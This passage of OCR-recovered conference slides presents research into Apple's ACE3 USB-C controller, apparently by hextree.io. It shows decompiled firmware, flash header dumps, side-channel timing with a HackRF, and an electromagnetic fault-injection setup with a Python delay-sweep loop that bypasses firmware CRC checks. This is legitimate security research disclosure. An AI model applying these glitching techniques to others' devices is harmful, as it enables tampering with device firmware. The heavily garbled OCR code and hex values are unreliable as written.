06018dc4 maybe_memset_segue(destination: &public_key_hesh, c: 6, count: x26)
6818dce maybe_memset_segue(destination: &public_key_hesh_from_otp, c: @, count: @x2@)
6018dd2 sub_279cc
06018dee sub_25276()
06018dfa maybe_memset_segue(destination: &data_20043bf4, c: @, count: @x18@)
0601806 maybe_memset_segue(destination: &data_20043a74, c: @, count: @x18@)
00018e8e *r4.1=8
6661818 uint32_t r1_26 = r@_24 << €x16 u>> 6x18
ec018e14 uint32_t r2_2 = zK.d(r@_24.b)
06818e16 int32_t r6_26 = 1
00018e1a int32_t r5_2
@c018e1a if ((r@_2@ & r2_2) != @)
06016e1c r5.2=1
006018e1a else if ((r@_21 & r2_2) != @)
06018024 r6.2=2
0601822 else if ((r@_21 & r1_20) == @)
es)
@30 AS thumb2 0x18de8-Ox!8dec (0x4 bytes)
With RSASO/2
@ hextree.io
```

## Slide 70

(But flash contents are not!)

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
eee © ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
% Symbols © rse *% = Mapped~ Linear~ High Level IL ~ EP HD=
Name Address * Section | @ int32_t perform_sig_check(char* arg, int32_t arg2) fl
{7} __rsa3072___ axeeaaesfes
86018d2e maybe_memset_segue(destination: arg1, c: 8, count: @x4@)
88818032 int32_t r@_18 = data_20843664
S @¢018d3a if (r@_1@ == @x142)
00018d3e data_20043a18 = 6
9. 66018d42 data_20043a64 = r3_16 + 6x40
— 06018048 data_20043a5c = data_20043e5c + 1
06018d50 if (zx.d(data_20043a18) != 6)
* 06018d54 *argl = 0x80
06018d5c argi[1] = (data_23043a58.w).b + (data_20043a5c.w) .b
% @¢@18d7c argi[2] = @ | ((zx.d(some_fw_update_struct?!.field_1@) + 1) << @xle u>> @xib).b | (zx.d(some_fw_update_etruct?! .f:
6€018d50 else
@6018d8a int32_t var_28_1 = @
de 06018d8e sha256(a1: &data_20643bf4, a2: 6x18, a3: &public_key_hash, a4: @)
aea18d98 load_from_otp(1, &public_key_hash_from_otp, @x2@)
06018da2 int32_t r@_2@ = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: @x2@)
a @6018dae char* r4_1 = load_from_otp(2, &public_key_hash_from_otp, 6x23)
@6018db8 int32_t r6_21 = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: @x2@)
06018dc4 maybe_memset_segue(destination: &public_key_hesh, c: 6, count: x26)
@6018dce maybe_memset_segue(destination: &public_key_hesh_from_otp, c: @, count: @x2@)
6018dd2 sub_279cc()
| 3] @€018dee sub_25276()
- 06018dfa maybe_memset_segue(destination: &data_20043bf4, c: @, count: @x18@)
Cross References 2 0601806 maybe_memset_segue(destination: &data_20043a74, c: @, count: @x18@)
> Filter (3) 06018e8e *r4.1=8
pion gig @) petse'a uinesat r22 = 2-d("8240)
eaDSiLO mee Lo Oiece (1) @€018e16 int32_t r@_26 = 1
_— 1& 08878de8 ints2t ré24 = rsa3e72(kd o6o18eia int32_t 5.2
+ sub_457fc {2} 0¢018e1a if ((r@.20 & r2_2) != @)
| @@0457fe void* const var_4 = rsa3A7 06018e1c r52=1
|@ 0845800 void* const var_4 = rsa337 0¢018e1a else if ((r@_21 & r2_2) != @)
06018024 r6.2=2
i] 0601822 else if ((r@_21 & r1_20) == @)
®30 5  thumb2 Ox18de8-Oxl8dec (0x4 bytes) &
But flash contents are not!
@ hextree.io
```

## Slide 71

###### Still found an attack!

Mix of software and hardware Abusable with root Survives full restores…

**hextree** .io

## Slide 72

###### But…

ACE2 is on its way out It doesn't do a whole lot iPhone 15 (Pro) uses successor

**hextree** .io

## Slide 73

# The ACE3

**hextree** .io

## Slide 74

###### ACE3

Texas Instruments SN25A12

**Zero** public information Used in iPhone 15 and MacBook Pro M3 Pro & Max

**hextree** .io

## Slide 75

###### ACE3

Runs a full USB stack ("Port DFU") Has access to some internal busses Interesting potential…

**hextree** .io

## Slide 76

###### ACE3

Doesn't use usbcfwflasher (libAce3Updater.dylib) Different upgrade mechanism on iPhone 15 vs. MacBook Pro 🥲 Updates are personalized

**hextree** .io

## Slide 77

###### Sooooooo… I ordered a MacBook M3 Max

**hextree** .io

## Slide 78

###### … and my vuln doesn't work :(

**hextree** .io

## Slide 79

###### Send it back…

**hextree** .io

## Slide 80

###### Send it back…

###### or…

**hextree** .io

## Slide 81

###### Send it back…

or…

**hextree** .io

## Slide 82

**hextree** .io

## Slide 83

**hextree** .io

## Slide 84

**hextree** .io

## Slide 85

**hextree** .io

## Slide 86

**hextree** .io

## Slide 87

**hextree** .io

## Slide 88

ACE3

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
-
se
Paxtia? <=
4a 4
qteitily
“4
7.
viveniny
Fornal
```

## Slide 89

SPI Flash

ACE3

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
SPI Flash
aaa
so
qtiitidly
“4
7.
vivening
```

## Slide 90

SPI Flash

ACE3

Debug
connectors

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
SPI Flash
peeiitty
eptinal
=
—
Debug
connectors ;
prtneity
Teper
yf
ost
ther
=
tat
=
i=
=<5
“*
```

## Slide 91

**hextree** .io

## Slide 92

🥲 Debug port seems disabled

**hextree** .io

## Slide 93

🥲 Debug port seems disabled …so let's dump the flash!

**hextree** .io

## Slide 94

**hextree** .io

## Slide 95

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
< 425:318 ms: 900 ps
Logic 2 [Logic Pro 16 - Disconnected] [m3 ace3 good-boot]
Ho. SPI Flash >
USB-C CC li _ —
®
ps Channel 5 Et
® SPI-MISO
?
On
pé Lightning IDO
b? Lightning L1p : MT TAT NT mT TTT a srarasn-apnama-aryacrargyn-nemmacarmnemar ga” :
® SPI-Clock
m3 ace3 good-boot@x + _
@ hextree.io
```

## Slide 96

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
€ >
#%
M3Flashdump....ied.bin.ondb
Cross References
> Filter (0)
+
© M3Flashdump_Verified.bin.bndb — Binary Ninja 4.0.4958-Stable
x? Mapped ~
e9ee4aa0
9080418
99@e4e20
99004030
99a84a40
eeae4ase
e0ae4e60
90@04a70
eaae4asa
99804898
e9ae4aae
99a04abe
908048c8
eeae4ade
@0004¢e0
eeae4efo
99004108
90804118
90004120
: 90004130
90804148
99804150
90004168
90804178
99004188
90804198
90804120
900041b0
@08041c8
99@841de
900041e0
90a041f8
99@e4200
90804218
90804220
99004238
90804248
99@04250
99004268
90804278
Hex +
a8 ef
a8 40
b2 46
ff ff
a7 80
1f @5
33 66
@e8 ao
b5 48
be@ @1
@7 @2
21 @e
48 3
63 18
ff 01
24 @6
98 78
2c ee
@1 64
86 @1
a9 a4
28 268
d4 c5
Of a6
63 @9
di 48
@8 a6
b5 85
60-68
60-7f
19-FF
Ff-fFf
60-f4
20-85
86-c8
80-60
f@-b3
b8-c9
65-61
ff-1c
42-63
26-61
49-38
43-a9
19-69
ff-7f
e6-54
49-44
0-77
66-13
0-49
21-68
67-65
bd-54
40-f8
60-1F
99-f6
46-61
2e-2d
d8-68
e8-62
e7-fe
d1-60
31-69
4f-68
f0-fb
98-38
2d-65
28
ab
ff
fF
le
b1
aB
80
ine
64
60
48
di
43
46
19
46
be
23
64
ff
d4
fF
43
de
23
te
de
of
6a
66
ff
ff
65
68
88
18
61
20
88
eb
16
68
88
68
7f
6a
13
10
6d
68
85
6a
co
80
6a
61
63
12
63
6d
21
41
62
6a
40
6a
ff
26
81
)*)
60
bd
68
38
6b
48
f8
1c
8
ba
20
6a
48
48
78
48
28
20
20
@9
98
21
28
da
7f
de
29
de
46
87
2d
ff
f4
6a
18
Je
FO
22
86
ce
18
24
93
88
8f
15
20
20
80
40
88
24
67
ba
81
6a
6a
12
86
63
b8
28
28
63
ba
7b
63
49
43
fa
@7
@30 A2!
oa inal
thumb2 0x422d  & extree.io
9 8
```

## Slide 97

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q Search types
» User Types: M3Flashdump_Verifie...
| Bjace3_binary_header AD. 98004808 struct ace3_firmware_header data_4000 =
eaea4ean {
S ace3_firmware_header eeeaseea uint32_t ace_id = @xaceeeaa3
@ struct1 eeee4ee4 uint32_t ace_version = @x2@4000
System Types: M3Flashdump_Verif... 9ee04e08 uint32_t unknown1 = 0x28
Platform: thumb2 0600460c uint32_t ace_binary_start_relative = 0x40
98004010 uint32_t boot_config = @xa8cO
98004614 uint32_t boot_config_size = 0x27f
98084818 uint32_t im4m_offset = @xab7f
8800481c uint32_t im4m_size = @x77f
98004628 uint32_t ace_binary_size = @xb2be
06084624 uint32_t ace_binary_cre = @x19889c3d
a 96004628 }
struct ace3_binar'
cooestca EiRTRRaTEnRERRee eae epee en
binary_size; 98084830
u[ 8x7];
binary_cre; 98004848 struct ace3_binary_header data_494@ =
version; eee04e40 {
boot_config_offset; 98684648 uint32_t binary_size = @xa7de
u2[@x4]; 96004644 uint32_t u[@x7] =
header_crc; 98004044 {
08004044 [6x8]
98004848 [6x1]
9e08484c [@x2]
eee04e50 [@x3]
96004654 [@x4]
06084858 [0x5]
0608465c [0x6]
98004068 }
> Filter (1) eaen4e6e uint32_t binary_erc = @x349@337d
Data References {1} eaease64 uint32_t version = @x2@400a
|€ 0904048 struct ace3_binary_header d 9004868 uint32_t boot_config_offset = Gxa8c@
0600466c uint32_t u2[6x4] =
06084G6c {
06684G6c [0xé]
96004070 (ex1]
68004874 [6x2]
88004878 [8x3]
9800467c }
9868467c uint32_t header_cre = @xe8fc067e
eeee4e8e }
6xG0720008
@x20851ef4
@x29051ef4
@x20051f68
6x2047725
@x618cb105
6x60286008
8x20047718
6xe9080008
6x@988G088
@x@9888008
wp hextree.io
```

## Slide 98

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
30
412
thumb2
'@e68 © M3Flashdump_Verified.bin.bndb — Binary Ninja 4.0.4958-Stable
© > Nofaame.teaomonge + +
% Types Search types = Mappedy Lineary High Level iL + Om= (x)
Name A Size x08 |
{T} ee RETA Beaesa00 struct ace3_firmware_header data_4900 = [ g
©) Gace3_firmware_header 6x28 eee4ce0 uint32_t ace_id = @xace@aea3
 struct_1 8x0 egee4ee4 uint32_t ace_version = @x204900
© System Types: M3Flashdump_Verif... 98004608 uint32_t unknown1 = @x2800
e Platform: thumb2 0660468c uint32_t ace_binary_start_relative = 6x40
96004618 uint32_t boot_config = @xa8cO
ye 06004614 uint32_t boot_config_size = 6x27f
98004818 uint32_t im4m_offset = @xab7f
re 9800481c uint32_t im4m_size = @x77f
96084620 in ace binary size = @xb2be
— ge0e4e24
ie aa 96084628 }
struct ace3_binary_header __packed
64 uint32_t u[@x7];
20 uint32_t binary_cre; 98084648 ~struct ace3_binary_header data_4@4@ =
24 uint32_t version; 96084640 {
28 uint32_t boot_config_offset; | 06684646 uint32_t binary_size = @xa7dc
2c uint32_t u2[6x4]; 4 96084644 uint32_t u[@x7] =
3c uint32_t header_erc; 06004644 {
40 }; 00004644 [Ox@] = 6x@072¢000
98004648 [@x1] = 6x20051ef4
9808404c {@x2] = @x20051ef4
96004650 [@x3] = @x29051f68
96604654 [@x4] = 6x20047725
sence 96004858 [x5] = @x@16cb105
Cross References 2 0600465c [@x6] = exeezaee09
> Filter (1) edo,
aeenaa6a
y Data References {1} 98084864 Uints2 t version = Ox2u40bd
|@ 90004048 struct ace3_binary_header d eaee4e68 uint32_t boot_config_offset = axa8c@
0600466c uint32_t u2[@x4] =
608486c {
9600466c [@x6] = 6x20047718
06604670 [6x1] = 6xe@e8ecoRe 9)
98004874 [@x2] = @x@aeaqaea
98004878 [@x3] = @x@o9BaeeRa
9808487c Q
9ee04e7c
eeee4ese } —
SSS SSS ON SSS TT ~
0x40c8-0x40ca (0x2 bytes) &
up hextree.io
```

## Slide 99

###### Can't get it to boot a modified firmware…

**hextree** .io

## Slide 100

###### Either I'm bad at reversing …

**hextree** .io

## Slide 101

Either I'm bad at reversing … … or they are good at engineering

**hextree** .io

## Slide 102

Either I'm bad at reversing … … or they are good at engineering (or both)

**hextree** .io

## Slide 103

###### What I tried…

Software vulnerability Physical SWD access Modifying & switching flash contents Fuzzing

…

**hextree** .io

## Slide 104

###### Sooooo

Completely documented chip No firmware Only some simple commands

**hextree** .io

## Slide 105

###### Sooooo

Completely documented chip No firmware Only some simple commands Time to give up?

**hextree** .io

## Slide 106

###### Fault Injection

**hextree** .io

## Slide 107

###### Fault Injection…

Introduce **faults** into the chip Allows to modify the behavior of the running software Voltage, Laser, BBI, Electro-Magnetic…

**hextree** .io

## Slide 108

###### Fault Injection…

Introduce **faults** into the chip Allows to modify the behavior of the running software Voltage, Laser, BBI, Electro-Magnetic… Often bricks chips…

**hextree** .io

## Slide 109

###### Voltage Fault Injection

3.3V
0V
Power supply

Time

**hextree** .io

## Slide 110

###### Voltage Fault Injection

3.3V
0V
Power supply

Time

**hextree** .io

## Slide 111

###### Voltage Fault Injection

3.3V
Precise delay
0V
Time
Power supply

**hextree** .io

## Slide 112

###### Voltage Fault Injection

Pulse
3.3V
Precise delay
0V
Time
Power supply

**hextree** .io

## Slide 113

###### Voltage Fault Injection

Pretty much requires soldering Removal of capacitors Best performed on potential bypass capacitors More difficult with shared voltage rails

**hextree** .io

## Slide 114

###### EMFI Electro-Magnetic Fault-Injection

**hextree** .io

## Slide 115

###### Electro-Magnetic Fault-Injection

Create high-voltage pulse into a coil This lets us inject current into a very precise location on the chip Skip instructions, change register values, etcpp

**hextree** .io

## Slide 116

###### Electro-Magnetic Fault-Injection

Create high-voltage pulse into a coil This lets us inject current into a very precise location on the chip Skip instructions, change register values, etcpp No target prep necessary!

**hextree** .io

## Slide 117

EMFI

**hextree** .io

## Slide 118

###### EMFI

**hextree** .io

## Slide 119

###### EMFI

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
- ra]
‘ d penny pried 5
ar uF
/ L ocd that tint t
=: eentnyy :
= tet
.
Bit | enme mete 7
< . N ? C&S partes waver
= <© eaete mene 1%
+ Anos
‘ .
saree sac dt
, eyes
= jana = = (tia
ims
| __§ {__4 It
vet ttt .
7
@® hextree.io
```

## Slide 120

###### EMFI

Chip
Hacked!

**hextree** .io

## Slide 121

But we need precise timing on when to inject our glitch…

**hextree** .io

## Slide 122

###### Side Channels

**hextree** .io

## Slide 123

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
HackRF One
1”
GREAT SCOTT GADGETS
```

## Slide 124

**hextree** .io

## Slide 125

###### **Capture magic chip waves**

**hextree** .io

## Slide 126

**hextree** .io

## Slide 127

**hextree** .io

## Slide 128

Start recording
spectrum on HackRF

**hextree** .io

## Slide 129

Start recording
spectrum on HackRF

Reboot ACE3 via
acetool3

**hextree** .io

## Slide 130

Start recording
spectrum on HackRF
Reboot ACE3 via
acetool3
Get EM recording

**hextree** .io

## Slide 131

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
€5 P m3 pro notes } OBO:
diotest copy.ipynb @ radiotest.ipynt @  @ radiotest copy 4.ipynb ® radiotest copy 5.ipyn> @ —@ radiotest copy Z.ipynb @ 0.
@ > @ radistest copy 5.ipynb > ..
ode + Markdown | [> Run All © Restart = Clear All Outputs | [J Variables |S Outine --- A glitching2 (Python 3.11
import matplotlib.pyplot as plt Stane-f
filename = “test_reboot2"
def waterfall file(filename):
data = np.fronfile(filename, dtype=np. int8)
data_complex = data[::2] + 1j * data[1::2]
# Reshape data for the waterfall plot
num_sanples_per_row = 1024 # This value can be adjusted
num_rows = len(dala_complex) // num_samples_per_row
data_reshaped = data_complex[:num_rows * num_samples_per_row].reshape((num_rows, num_samples_per_row))
# Compute FFT
fft_data = np. fft.fftshift(np.fft.fft(data_reshaped, axis=1), axes=1)
magnitude = 20 * np.log10(np.abs(fft_data))
# Frequency range for the x-axis
sampling_rate = 10e6 # 10 MHz
frequency_start = -sampling_rate / 2 # -5 MHz
frequency_end = sampling_rate / 2 #5 MHz
center_frequency ~ 44366500 # 44.3665 MHz
frequencies = np. linspace(frequency_start, frequency_end, num_samples_per_row) + center_frequency
# Plotting
plt.imshow(magnitude, aspect='auto', extent=[frequencies(®], frequencies(-1], @, num_rows], cmap='viridis')
plt.colorbar(label='"Nagnituce (dB)')
plt.xlabel( ‘Frequency (Hz)')
plt.ylabel( ‘Time Index')
plt.title( filename)
plt.show()
def waterfall_file16(filename):
data = np.fronfile(filename, dtype=np. int16)
data_complex = data[::2] + 1) * data[1::2]
# Reshape data for the waterfall plot
num_sanples_per_row = 1024 # This value can be adjusted
num_rows = len(data_complex) // num_samples_per_row
data_reshaped = data_complex[:num_rows * num_samples_per_row].reshape((num_rows, num_samples_per_row))
# Compute FFT
fft_data = np. fft.fftshift(np. fft.fft(data_reshaped, axis=1), axes=1)
magnitude = 20 * np. log10(np.abs(fft_data))
# Frequency range for the x-axis
sampling_rate = 10e6 # 10 MHz
frequency_start = -sampling_rate / 2 # -5 MHz
frequency_end = sampling_rate / 2 #5 MHz
center_frequency = 44366500 # 44.3665 MHz
frequencies = np. linspace(frequency_start, frequency_end, num_samples_per_row) + center_frequency
# Plotting
plt.imshow(magnitude, aspect='auto', extent=[frequencies(®), frequencies[-1), ©, num_rows), cmap='viridis')
plt.colorbar(label='Nagnituce (dB)')
plt.xlabel('Frequency (Hz)')
plt.ylabel('Time Index')
plt.title(filename)
plt.show()
```

## Slide 132

**hextree** .io

## Slide 133

**hextree** .io

## Slide 134

**hextree** .io

## Slide 135

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
HACKRF ONE HARDWARE
eee Identify the Trigger Pins
Minimum Host System Requirements . ; . ;
for HackRF HackRF One has four normally-populated pin headers, three of which are arranged in a 'C’ shape.
On the circuit board these are marked P28, P22, and P20. P28 is the header nearest to the center
of the board. Locate pins 15 (trigger output) and 16 (trigger input) on header P28.
List of Hardware Revisions
Hardware Components
LEDs
Buttons
Connectors
External Clock Interface (CLKIN and
CLKOUT)
Expansion Interface
© Hardware Triggering
Clock Synchronization
Requirements
eonnecd the Trigger Output t to the Trigger Input
Open Your HackRF One
Identify the Trigger Pins First ensure that the two devices share a common ground. This may be accomplished by connecting
Connect the Trigger Output to the one’s CLKIN to the other’s CLKOUT as recommended above. Alternatively, connect a jumper wire
Trigger Input from P28 pin 2 on one HackRF One to P28 pin 2 on the other HackRF One.
Usage
Next use a jumper wire to connect P28 pin 15 (trigger output) on one HackRF One to P28 pin 16
(trigger input) on the other HackRF One.
Additional Devices
& Read the Docs
```

## Slide 136

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
D4
DS
D6
Flash MOSI
Flash MISO
Flash Clock
Flash CS
2s
+0.1s
|
t
+0.2s
+0.3s
@ hextree.io
```

## Slide 137

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
D4
Flash MOSI
<
42s:96ms:700 us
+70 ps
H
+80 ps
+90 ps
2s:96 ms: 800 ps
+10 ps
+20 ps
DS
D/
D6
Flash MISO
Flash Clock
Flash CS
& hextree.io
```

## Slide 138

**hextree** .io

## Slide 139

###### Start recording on CS trigger on HackRF

**hextree** .io

## Slide 140

Start recording on CS
trigger on HackRF

Reboot ACE3 via
acetool3

**hextree** .io

## Slide 141

Start recording on CS trigger on HackRF

Reboot ACE3 via
acetool3
Get perfectly aligned
🥳
recording

**hextree** .io

## Slide 142

**hextree** .io

## Slide 143

**hextree** .io

## Slide 144

**hextree** .io

## Slide 145

Flash chip-select line for trigger

**hextree** .io

## Slide 146

**hextree** .io

## Slide 147

##### Perfect recordings!

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
| . sada Lea a nd ada abhi |
Perfect recordings!
ll
shextree.io
```

## Slide 148

**hextree** .io

## Slide 149

**hextree** .io

## Slide 150

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
p4 Flash MOSI
5 Flash MISO
07 Flash Clock
06 FlashCS
```

## Slide 151

How do we use this side-channel to time our glitch?

**hextree** .io

## Slide 152

Change firmware

**hextree** .io

## Slide 153

Change firmware

Reboot ACE3 via
acetool3 & record

**hextree** .io

## Slide 154

Change firmware
Reboot ACE3 via
acetool3 & record

Compare differences

**hextree** .io

## Slide 155

**hextree** .io

## Slide 156

Try flashing til it
works

**hextree** .io

## Slide 157

Try flashing til it
works

**hextree** .io

## Slide 158

Try flashing til it
works

Measure

**hextree** .io

## Slide 159

Try flashing til it
works

Measure

**hextree** .io

## Slide 160

###### Original Firmware

**hextree** .io

## Slide 161

###### Original Firmware

###### Modified firmware

**hextree** .io

## Slide 162

###### Original Firmware

###### Modified firmware

**hextree** .io

## Slide 163

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ovue4euu struct aces_Tirmware_neader aata_40u0 =
ea9e4ee0 {
68004068
68004004
68064068
@80040Gc
66064010
68064014
@6004018
@800401c
8004020
@6004024
@8004028 }
@6004028
uint32_t ace_id = @xace9@ee3
uint32_t ace_version = 9x204908
uint32_t unknown1 = @x28@@
uint32_t ace_binary_start_relative = 0x46
uint32_t boot_config = Oxa8cO
uint32_t boot_config_size = 0x27f
uint32_t im4m_offset = Oxab7f
uint32_t im4m_size = 0x77f
uint32_t ace_binary_size = @xb2be
uint32_t ace_binary_cre = 0x19@89c3d
@68004040 struct ace3_binary_header data_404@ =
ea00e4040 {
8004040
60004044
68004044
@6004044
60004048
@800404c
@6004850
@6004054
€6004058
@600405c
66004060
08004060
06004064
66004068
@800406c
0600406c
@600406c
08004070
@8004074
68004078
@800407c
eg00407c
eage4eR8o =}
uint32_t binary_size = Oxa7dc
uint32_t u[@x7] =
{
[@x@] = x9e72e008
[@x1] = 0x2e051ef4
[@x2] = ©x2e051ef4
[@x3] = ©x20051f68
[@x4] = 0x2@047725
[@x5] = @x018cb105
[@x6] = @xee20e008
}
uint32_t binary_cre = @x340@337d
uint32_t version = @x284080
uint32_t boot_config_offset = @xa8&c@
uint32_t u2[@x4] =
{
[exe] = ©x2@047718
[@x1] = @xeeeeee9e
[@x2] = exeeaee—ea
[@x3] = exeeaaeaea
}
uint32_t header_crc = @xeBfc867e
@ hextree.io
```

## Slide 164

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ovue4euu struct aces_Tirmware_neader aata_40u0 =
ea9e4ee0 {
68004068
68004004
68064068
@80040Gc
66064010
68064014
@6004018
@800401c
8004020
@6004024
@8004028 }
@6004028
uint32_t
uint32_t
uint32_t
uint32_t
uint32_t
uint32_t
uint32_t
uint32_t
ace_id = @xace9@803
ace_version = 9x20400@
unknown1 = @x286@
ace_binary_start_relative = @x4@
boot_config = 9xa8c@
boot_config_size = 0x27f
im4m_offset = Oxab7f
im4m_size = 0x77f
uint32_t_ace_binary_size = @xb2be
uint32_t ace_binary_cre = @x19@89c3d
@68004040 struct ace3_binary_header data_404@ =
ea00e4040 {
8004040
60004044
68004044
@6004044
60004048
@800404c
@6004850
@6004054
€6004058
@600405c
66004060
08004060
06004064
66004068
@800406c
0600406c
@600406c
08004070
@8004074
68004078
@800407c
eg00407c
eage4eR8o =}
uint32_t
uint32_t
{
[exe]
[6x1]
[@x2] =
[@x3]
[6x4]
[@x5]
[@x6]
binary_size = Oxa7dc
u[@x7] =
6x90720008
@x20051ef4
@x2e0051ef4
@x20051f68
@x20047725
@x910cb105
6x90200008
uint32_t
uint32_t
uint32_t
{
[@x@]
[@x1]
[@x2]
[8x3]
uint32_t binary_cre = @x340@337d
version =
boot_config_offset = @xa8c@
u2[@x4] =
@x20047718
6x9e900008
6xee900008
@xee9e0908
uint32_t header_crc = @xeBfc867e
@ hextree.io
```

## Slide 165

Original Firmware

## Slide 166

Original Firmware

Wrong first CRC

## Slide 167

###### Original Firmware

Wrong first CRC

Wrong second CRC

## Slide 168

###### Original Firmware

Wrong first CRC

Wrong second CRC

Wrong third CRC

## Slide 169

###### Original Firmware

Wrong third CRC

## Slide 170

###### Original Firmware

###### Wrong third CRC

## Slide 171

###### Original Firmware

Glitch here! Wrong third CRC

## Slide 172

## Slide 173

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ riety weiny Ber ot
ah" eee
} | al thot font
o eenninyy ”
trot
—
=.
t }
— J 2 Es erbe rete |
== ‘
pm,
eee
..
```

## Slide 174

## Slide 175

## Slide 176

## Slide 177

## Slide 178

## Slide 179

## Slide 180

## Slide 181

**hextree** .io

## Slide 182

###### ChipSHOUTER

**hextree** .io

## Slide 183

###### ChipSHOUTER

###### ChipWhisperer Husky for triggering

**hextree** .io

## Slide 184

ChipSHOUTER

###### Trigger ChipWhisperer Husky connection for triggering

**hextree** .io

## Slide 185

###### ChipSHOUTER

###### ChipWhisperer Husky for triggering

Trigger connection

Ground Connection

**hextree** .io

## Slide 186

ChipSHOUTER

###### Trigger ChipWhisperer Husky connection for triggering

Ground Connection

Not shown: Days of debugging

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
! ChipSHOUTER
Trigger
connection
.vene
ChipWhisperer Husky
for triggering
Ground
Connection ae &
.
Not shown: Days of debugging Pa
```

## Slide 187

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ui ABojouy 34 ym
(eeeds CESMIYIINOHS cit 5 |
@ hextree.io
```

## Slide 188

###### Attempt  1: Change version string

**hextree** .io

## Slide 189

**hextree** .io

## Slide 190

###### `SN2012025 HW00A1 FW002.045.00 ZACE3`

**hextree** .io

## Slide 191

###### `SN2012025 HW00A1 FW002.045.00 ZACE3`

**hextree** .io

## Slide 192

###### `SN2012025 HW00A1 FW002.045.00 ZACE3`

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
[research@researchs-MBP aceglitch % sudo hpmdiagnose | grep 0x2f
Ox2F Qx4@ 0x534E32303132303235204857303041312046573030322E3834302E3030205A414345332D4A353134503031880000000000000000000000000000000000000000
@x80082000 83 20
*
@x@0@82020 3F Bé
*
@x80082060 82 E3
0x8@0082070 66 60
*
(tees oe Pe
|e ecerEcccnceeWe
@ hextree.io
```

## Slide 193

**hextree** .io

## Slide 194

Arm Husky  &
ChipSHOUTER

**hextree** .io

## Slide 195

Arm Husky  &
ChipSHOUTER

Reboot ACE3 via acetool3

**hextree** .io

## Slide 196

Arm Husky  &
Reboot ACE3 via
ChipSHOUTER
acetool3

Wait for glitch

**hextree** .io

## Slide 197

Arm Husky  &
ChipSHOUTER

Reboot ACE3 via acetool3

Check status "APP" vs "ADFU"

Wait for glitch

**hextree** .io

## Slide 198

Arm Husky  &
Reboot ACE3 via
ChipSHOUTER
acetool3
Check status
"APP" vs "ADFU"
Wait for glitch

**hextree** .io

## Slide 199

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
center = 44793408
pulse = 20
success = False
while not success:
for delay in trange(center - 1000, center + 1000):
setup_husky(delay, pulse)
result = test_ace()
print(f'"{result} {delay} {pulse}")
if result == "APP":
print(f"Success: {delay}")
success = True
break
Python
Python
xtree.io
```

## Slide 200

###### The troubles…

ACE sometimes completely stops responding → Auto-reboot After reboot, MacBook stops charging while one ACE is "bricked" 8 hours, then have to restore ACE3 and start over…

**hextree** .io

## Slide 201

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Y 26m 38.5s
736/2000 [26:38<12:52, 1.64it/s]
ADFU 447924@8 20
ADFU 44792409 20
ADFU 44792410 20
ADFU 44792411 20
ADFU 44792412 20
ADFU 44792413 20
ADFU 44792414 20
ADFU 44792415 20
ADFU 44792416 20
ADFU 44792417 20
ADFU 44792418 20
ADFU 44792419 20
ADFU 44792420 20
ADFU 44792421 20
ADFU 44792422 20
ADFU 44792423 20
ADFU 44792424 20
ADFU 44792425 20
ADFU 44792426 20
ADFU 44792427 20
ADFU 44792428 20
ADFU 44792429 20
ADFU 44792430 20
ADFU 44792431 20
ADFU 44792432 20
ADFU 44793142 20
ADFU 44793143 20
APP 44793144 20 @ hextree.io
Success: 44793144
```

## Slide 202

###### `SN2012025 HW00A1 FW002.042.00 ZACE3`

**hextree** .io

## Slide 203

🥳 We glitched the ACE3!

**hextree** .io

## Slide 204

###### But…

We can only modify patches We don't know what the patches patch We have no input/output

**hextree** .io

## Slide 205

###### But…

We can only modify patches We don't know what the patches patch We have no input/output But we have the ACE2 firmware…

**hextree** .io

## Slide 206

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ || (zx.d(**(arg2 + 4)) up> 7 !=6 8
"90040f6c
a04efGe
uiltin_strnopy(dest: &data_2@04905c_Cl
data_ 200424f1 = *r6
sub_4@c6c()
88048eee int32_t r5 = @
60040ef2 if (data_2064065c_CURRENT_MODE_1 == 'DISC')
8004684 label_46f84:
e004ef384 r5=3
00040ef8 else
60048ef8 if (data_2@@4605c_CURRENT_MODE_1 == ‘UFPf')
60040ef8 goto label_49f84
6804Gefe if (data_2004005c_CURRENT_MODE_1 == ‘DFUf’)
e0040efe goto label_49f84
eee4efe2 var_18 = &data_20842988
66046f68 if (zx.d(data_28042991) == @)
e0046f68 goto label_49f84
00040f10 if (sub_44cec8() == @)
60046T10 goto label _49f84
60046f28 if (zx.d(**(arg2 + 4)) u>> 7 ==
60040f40 int32_t data_2004@@5c_CURRENT_MODE_2 = data_2004065c_CURRENT_MODE
B0848T42 if (zx.d(*r6) << @xif == 8)
60048T82 if (data_2004005c_CURRENT_MODE_2 != 'USBw')
80849F82 ACE3 goto label_46f84
